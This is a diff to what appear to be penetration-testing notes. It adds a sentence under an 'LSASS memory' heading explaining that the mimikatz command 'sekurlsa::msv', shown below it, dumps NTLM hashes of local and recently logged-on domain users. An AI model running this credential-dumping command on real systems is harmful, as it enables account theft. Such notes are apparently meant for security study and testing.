@@ -42,6 +42,8 @@ User : jarrett.gxz
 
 ### (2) LSASS memory
 
+This method will allow us to retrieve any NTLM hashes for local users and any domain user that has recently logged onto the machine.
+
 ```
 mimikatz # sekurlsa::msv
 ```
